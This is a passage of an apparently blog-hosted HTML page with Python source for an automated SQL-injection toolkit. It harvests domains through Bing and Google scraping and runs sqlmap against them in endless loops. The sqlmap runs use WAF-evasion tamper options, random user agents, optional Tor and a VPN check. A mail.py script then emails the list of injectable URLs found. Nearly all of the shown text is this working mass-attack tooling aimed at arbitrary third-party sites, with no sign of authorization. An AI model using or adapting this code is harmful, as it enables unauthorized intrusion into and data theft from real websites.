					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
					<span class="n">mysqlmap</span><span class="p">.</span><span class="nf">sqlmap_g_nohuman</span><span class="p">(</span><span class="sh">"</span><span class="s">GoogleScraper_bing_https_domain_list.txt</span><span class="sh">"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
					<span class="k">try</span><span class="p">:</span>
						<span class="n">mysqlmap</span><span class="p">.</span><span class="nf">sqlmap_g_nohuman</span><span class="p">(</span><span class="sh">"</span><span class="s">bing_https_domain_list.txt</span><span class="sh">"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>	
					<span class="k">except</span><span class="p">:</span>
						<span class="k">pass</span>
				<span class="k">else</span><span class="p">:</span>
					<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">vpn is off,scan will continue till vpn is on</span><span class="sh">"</span><span class="p">)</span>




		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">3</span><span class="p">:</span>
			<span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
				<span class="k">if</span> <span class="nf">checkvpn</span><span class="p">():</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">'''</span><span class="s">!!!attention:all firefox process will be kill after easy_search</span><span class="sh">'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">1111111111111111111success here</span><span class="sh">"</span><span class="p">)</span>
					<span class="n">mysqlmap</span><span class="p">.</span><span class="nf">sqlmap_g_human</span><span class="p">(</span><span class="sh">"</span><span class="s">GoogleScraper_bing_https_domain_list.txt</span><span class="sh">"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">2222222222222222222success here</span><span class="sh">"</span><span class="p">)</span>
					<span class="k">try</span><span class="p">:</span>
						<span class="n">mysqlmap</span><span class="p">.</span><span class="nf">sqlmap_g_human</span><span class="p">(</span><span class="sh">"</span><span class="s">bing_https_domain_list.txt</span><span class="sh">"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
					<span class="k">except</span><span class="p">:</span>
						<span class="k">pass</span>
				<span class="k">else</span><span class="p">:</span>
					<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">vpn is off,scan will continue till vpn is on</span><span class="sh">"</span><span class="p">)</span>



		<span class="k">elif</span> <span class="n">num</span><span class="o">!=</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">num</span><span class="o">!=</span><span class="mi">2</span> <span class="ow">and</span> <span class="n">num</span><span class="o">!=</span><span class="mi">3</span><span class="p">:</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">choose number wrong</span><span class="sh">"</span><span class="p">)</span>



	<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">3</span><span class="p">:</span>
		<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">input your targets path here:&gt;</span><span class="sh">"</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
		<span class="n">targets</span><span class="o">=</span><span class="nf">input</span><span class="p">()</span>
		<span class="nf">print</span><span class="p">(</span><span class="sh">'''</span><span class="s">there are three kinds of sqli blew:
1.use </span><span class="sh">"</span><span class="s">sqlmap_crawl</span><span class="sh">"</span><span class="s"> 
2.use </span><span class="sh">"</span><span class="s">sqlmap-g-nohuman</span><span class="sh">"</span><span class="s">
3.use </span><span class="sh">"</span><span class="s">sqlmap-g-human
input your number here:</span><span class="sh">'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
		<span class="n">num</span><span class="o">=</span><span class="nf">int</span><span class="p">(</span><span class="nf">input</span><span class="p">())</span>
		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
			<span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
				<span class="k">if</span> <span class="nf">checkvpn</span><span class="p">():</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 my_bing_domains_v1_alone.py %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">'''</span><span class="s">os.system(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 my_bing_domains_v1_alone.py %s</span><span class="sh">"</span><span class="s"> % targets) execute.</span><span class="sh">'''</span><span class="p">)</span>
					<span class="n">mysqlmap</span><span class="p">.</span><span class="nf">sqlmap_craw</span><span class="p">(</span><span class="sh">"</span><span class="s">bing_origin_https_domain_url_list.txt</span><span class="sh">"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
				<span class="k">else</span><span class="p">:</span>
					<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">vpn is off,scan will continue till vpn is on</span><span class="sh">"</span><span class="p">)</span>

		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">2</span><span class="p">:</span>
			<span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
				<span class="k">if</span> <span class="nf">checkvpn</span><span class="p">():</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 my_bing_domains_v1_alone.py %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 my_bing_domains_v1_alone.py -f %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">8888888888888success here</span><span class="sh">"</span><span class="p">)</span>
					<span class="n">mysqlmap</span><span class="p">.</span><span class="nf">sqlmap_g_nohuman</span><span class="p">(</span><span class="sh">"</span><span class="s">bing_https_domain_list.txt</span><span class="sh">"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
				<span class="k">else</span><span class="p">:</span>
					<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">vpn is off,scan will continue till vpn is on</span><span class="sh">"</span><span class="p">)</span>



		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">3</span><span class="p">:</span>
			<span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
				<span class="k">if</span> <span class="nf">checkvpn</span><span class="p">():</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 my_bing_domains_v1_alone.py %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
					<span class="n">mysqlmap</span><span class="p">.</span><span class="nf">sqlmap_g_human</span><span class="p">(</span><span class="sh">"</span><span class="s">bing_https_domain_list.txt</span><span class="sh">"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
				<span class="k">else</span><span class="p">:</span>
					<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">vpn is off,scan will continue till vpn is on</span><span class="sh">"</span><span class="p">)</span>


		<span class="k">elif</span> <span class="n">num</span><span class="o">!=</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">num</span><span class="o">!=</span><span class="mi">2</span> <span class="ow">and</span> <span class="n">num</span><span class="o">!=</span><span class="mi">3</span><span class="p">:</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">choose number wrong</span><span class="sh">"</span><span class="p">)</span>




	<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">4</span><span class="p">:</span>
		<span class="nf">print</span><span class="p">(</span><span class="sh">'''</span><span class="s">input your keyword you want google to search&gt;</span><span class="sh">'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
		<span class="n">keyword</span><span class="o">=</span><span class="nf">input</span><span class="p">()</span>
		<span class="nf">print</span><span class="p">(</span><span class="sh">'''</span><span class="s">!!!attention:all firefox process will be kill after easy_search</span><span class="sh">'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>		
		<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'''</span><span class="s">/root/myenv/bin/python3.5 easy_search.py </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"'''</span> <span class="o">%</span> <span class="n">keyword</span><span class="p">)</span>
		<span class="c1">#mysqlmap.sqlmap_g_human("GoogleScraper_origin_https_domain_url_list.txt",bool_tor)
</span>		<span class="c1">#above is a wrong action to use sqlmap_g_human,coz there exist easy_search.py's 
</span>		<span class="c1">#function in mysqlmap.sqlmap_g_human(),then use below to make it good to work:
</span>		


		<span class="n">sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3</span><span class="sh">'''</span>
		<span class="n">forms_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms</span><span class="sh">'''</span>
		<span class="n">tor_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3</span><span class="sh">'''</span>
		<span class="n">tor_forms_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms</span><span class="sh">'''</span>
		<span class="c1">#print("sqlmap_string is:%s" % sqlmap_string)
</span>		<span class="k">if</span> <span class="n">bool_tor</span><span class="o">==</span><span class="bp">False</span><span class="p">:</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">forms_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
			<span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
				<span class="k">if</span> <span class="nf">checkvpn</span><span class="p">():</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
				<span class="k">else</span><span class="p">:</span>
					<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">vpn is off,scan will continue till vpn is on</span><span class="sh">"</span><span class="p">)</span>

		<span class="k">elif</span> <span class="n">bool_tor</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">tor_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">tor_forms_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
			<span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
				<span class="k">if</span> <span class="nf">checkvpn</span><span class="p">():</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
				<span class="k">else</span><span class="p">:</span>
					<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">vpn is off,scan will continue till vpn is on</span><span class="sh">"</span><span class="p">)</span>


	<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">5</span><span class="p">:</span>
		<span class="nf">print</span><span class="p">(</span><span class="sh">'''</span><span class="s">attention!!!
once you choosed this function, make sure your </span><span class="sh">"</span><span class="s">targets.txt</span><span class="sh">"</span><span class="s"> file has urls 
like:https://xxx.xxx..or https://xxx.xxx..,
but not xxx.xxx.xxx without url.scheme</span><span class="sh">'''</span><span class="p">)</span>
		<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">input your targets path here:&gt;</span><span class="sh">"</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
		<span class="n">targets</span><span class="o">=</span><span class="nf">input</span><span class="p">()</span>
		<span class="nf">print</span><span class="p">(</span><span class="sh">'''</span><span class="s">there are three kinds of sqli blew:
1.use </span><span class="sh">"</span><span class="s">sqlmap_crawl</span><span class="sh">"</span><span class="s"> 
2.use </span><span class="sh">"</span><span class="s">sqlmap-g-nohuman</span><span class="sh">"</span><span class="s">
3.use </span><span class="sh">"</span><span class="s">sqlmap-g-human
input your number here:</span><span class="sh">'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
		<span class="n">num</span><span class="o">=</span><span class="nf">int</span><span class="p">(</span><span class="nf">input</span><span class="p">())</span>
		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
			<span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
				<span class="k">if</span> <span class="nf">checkvpn</span><span class="p">():</span>
					<span class="n">mysqlmap</span><span class="p">.</span><span class="nf">sqlmap_craw</span><span class="p">(</span><span class="sh">"</span><span class="s">targets.txt</span><span class="sh">"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
				<span class="k">else</span><span class="p">:</span>
					<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">vpn is off,scan will continue till vpn is on</span><span class="sh">"</span><span class="p">)</span>


		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">2</span><span class="p">:</span>
			<span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
				<span class="k">if</span> <span class="nf">checkvpn</span><span class="p">():</span>
					<span class="n">mysqlmap</span><span class="p">.</span><span class="nf">sqlmap_g_nohuman</span><span class="p">(</span><span class="sh">"</span><span class="s">targets.txt</span><span class="sh">"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
				<span class="k">else</span><span class="p">:</span>
					<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">vpn is off,scan will continue till vpn is on</span><span class="sh">"</span><span class="p">)</span>
			
		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">3</span><span class="p">:</span>
			<span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
				<span class="k">if</span> <span class="nf">checkvpn</span><span class="p">():</span>
					<span class="n">mysqlmap</span><span class="p">.</span><span class="nf">sqlmap_g_human</span><span class="p">(</span><span class="sh">"</span><span class="s">targets.txt</span><span class="sh">"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
				<span class="k">else</span><span class="p">:</span>
					<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">vpn is off,scan will continue till vpn is on</span><span class="sh">"</span><span class="p">)</span>
			
		<span class="k">elif</span> <span class="n">num</span><span class="o">!=</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">num</span><span class="o">!=</span><span class="mi">2</span> <span class="ow">and</span> <span class="n">num</span><span class="o">!=</span><span class="mi">3</span><span class="p">:</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">choose number wrong</span><span class="sh">"</span><span class="p">)</span>

	<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">/usr/bin/python2.7 mail.py</span><span class="sh">'</span><span class="p">)</span>
	<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'''</span><span class="s">mv -f /root/.sqlmap/output_bak/* /root/.sqlmap/output</span><span class="sh">'''</span><span class="p">)</span>
</code></pre></div></div>

<p>6&gt;mail.py</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># -*- coding: utf-8 -*-
# make sure your MyToolKit folder has only target file,and make its
# ext 'targets.txt',otherwise you should change the source code to make it 
# good to use.
# 
# #/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
#
# -*- coding: utf-8 -*-
# make sure your MyToolKit folder has only target file,and make its
# ext 'targets.txt',otherwise you should change the source code to make it 
# good to use.
# 
# #/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
#
</span><span class="kn">import</span> <span class="n">smtplib</span>
<span class="kn">from</span> <span class="n">email.mime.text</span> <span class="kn">import</span> <span class="n">MIMEText</span>
<span class="kn">from</span> <span class="n">email.header</span> <span class="kn">import</span> <span class="n">Header</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="c1">#下面一行要设置成你自己的邮件服务器的地址以及用户名密码发件人信息
</span>


<span class="k">def</span> <span class="nf">sendMail</span><span class="p">(</span><span class="n">mailto</span><span class="p">,</span><span class="n">subject</span><span class="p">,</span><span class="n">body</span><span class="p">,</span><span class="nb">format</span><span class="o">=</span><span class="sh">'</span><span class="s">plain</span><span class="sh">'</span><span class="p">):</span>

    <span class="c1">#host,user,password,fromMail = smtpInfo
</span>    <span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">xxxxxxxxxx</span><span class="sh">'</span>
    <span class="n">user</span><span class="o">=</span><span class="sh">'</span><span class="s">xxxxxxxxxx</span><span class="sh">'</span>
    <span class="n">password</span><span class="o">=</span><span class="sh">'</span><span class="s">xxxxxxxxxx</span><span class="sh">'</span>
    <span class="n">fromMail</span><span class="o">=</span><span class="sh">'</span><span class="s">xxxxxxxxxx</span><span class="sh">'</span>

    <span class="k">if</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">body</span><span class="p">,</span><span class="nb">unicode</span><span class="p">)</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">body</span><span class="o">=</span><span class="nf">str</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
    <span class="n">me</span><span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="s">%s&lt;</span><span class="sh">"</span><span class="o">+</span><span class="n">fromMail</span><span class="o">+</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="nc">Header</span><span class="p">(</span><span class="sh">'</span><span class="s">naruto</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">),)</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="nc">MIMEText</span><span class="p">(</span><span class="n">body</span><span class="p">,</span><span class="nb">format</span><span class="p">,</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">subject</span><span class="p">,</span><span class="nb">unicode</span><span class="p">):</span>
        <span class="n">subject</span> <span class="o">=</span> <span class="nf">unicode</span><span class="p">(</span><span class="n">subject</span><span class="p">)</span>
    <span class="n">msg</span><span class="p">[</span><span class="sh">'</span><span class="s">Subject</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">subject</span>
    <span class="n">msg</span><span class="p">[</span><span class="sh">'</span><span class="s">From</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">me</span>
    <span class="n">msg</span><span class="p">[</span><span class="sh">'</span><span class="s">To</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">mailto</span>
    <span class="n">msg</span><span class="p">[</span><span class="sh">"</span><span class="s">Accept-Language</span><span class="sh">"</span><span class="p">]</span><span class="o">=</span><span class="sh">"</span><span class="s">zh-CN</span><span class="sh">"</span>
    <span class="n">msg</span><span class="p">[</span><span class="sh">"</span><span class="s">Accept-Charset</span><span class="sh">"</span><span class="p">]</span><span class="o">=</span><span class="sh">"</span><span class="s">ISO-8859-1,utf-8</span><span class="sh">"</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">smtplib</span><span class="p">.</span><span class="nc">SMTP</span><span class="p">()</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">ehlo</span><span class="p">()</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">starttls</span><span class="p">()</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">ehlo</span><span class="p">()</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">set_debuglevel</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">login</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="n">password</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">sendmail</span><span class="p">(</span><span class="n">me</span><span class="p">,</span> <span class="n">mailto</span><span class="p">,</span> <span class="n">msg</span><span class="p">.</span><span class="nf">as_string</span><span class="p">())</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">quit</span><span class="p">()</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">except</span> <span class="nb">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span> <span class="nf">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">False</span>



<span class="k">def</span> <span class="nf">read_save_msg_from_csv</span><span class="p">(</span><span class="n">csv_file</span><span class="p">):</span>
	<span class="n">f</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">csv_file</span><span class="p">,</span><span class="sh">"</span><span class="s">r+</span><span class="sh">"</span><span class="p">)</span>
	<span class="nb">list</span><span class="o">=</span><span class="n">f</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
	<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
	<span class="n">return_list</span><span class="o">=</span><span class="p">[]</span>
	<span class="kn">import</span> <span class="n">re</span>
	<span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">:</span>
		<span class="n">matchobj</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">,</span><span class="n">each</span><span class="p">)</span>
		<span class="k">if</span> <span class="n">matchobj</span><span class="p">:</span>
			<span class="c1">#print each
</span>			<span class="n">each</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">(\s)</span><span class="sh">'</span><span class="p">,</span><span class="sh">""</span><span class="p">,</span><span class="n">each</span><span class="p">)</span>
			<span class="n">return_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>      
        <span class="c1">#print return_list
</span>        <span class="k">return</span> <span class="n">return_list</span>
<span class="k">def</span> <span class="nf">get_result_from_folder</span><span class="p">(</span><span class="n">folder</span><span class="p">):</span>	
	<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">ls %s/*.csv &gt; csv_file_list.txt</span><span class="sh">"</span> <span class="o">%</span> <span class="n">folder</span><span class="p">)</span>
	<span class="n">f</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">csv_file_list.txt</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">r+</span><span class="sh">"</span><span class="p">)</span>
	<span class="nb">list</span><span class="o">=</span><span class="n">f</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
	<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
	<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">rm csv_file_list.txt</span><span class="sh">"</span><span class="p">)</span>
	<span class="n">final_list</span><span class="o">=</span><span class="p">[]</span>
	<span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">:</span>
		<span class="n">each</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">(\s)</span><span class="sh">'</span><span class="p">,</span><span class="sh">""</span><span class="p">,</span><span class="n">each</span><span class="p">)</span>
		<span class="c1">#print each
</span>		<span class="n">list_from_single_file</span><span class="o">=</span><span class="nf">read_save_msg_from_csv</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>
		<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">list_from_single_file</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">:</span>
			<span class="n">final_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">list_from_single_file</span><span class="p">)</span>
	<span class="c1">#print final_list
</span>	<span class="k">return</span> <span class="n">final_list</span>



<span class="k">def</span> <span class="nf">getIp</span><span class="p">(</span><span class="n">domain</span><span class="p">):</span>    
    <span class="k">try</span><span class="p">:</span>
    	<span class="n">myaddr</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">getaddrinfo</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span><span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">4</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
    	<span class="k">return</span> <span class="n">myaddr</span>
    <span class="k">except</span><span class="p">:</span>
    	<span class="k">pass</span>

<span class="c1">#all_nics_ip=socket.gethostbyname_ex(sharedHost)[2]
</span>


<span class="k">def</span> <span class="nf">get_source_domain_of_target_sqli_urls</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
	<span class="kn">import</span> <span class="n">socket</span>
	<span class="kn">import</span> <span class="n">re</span>
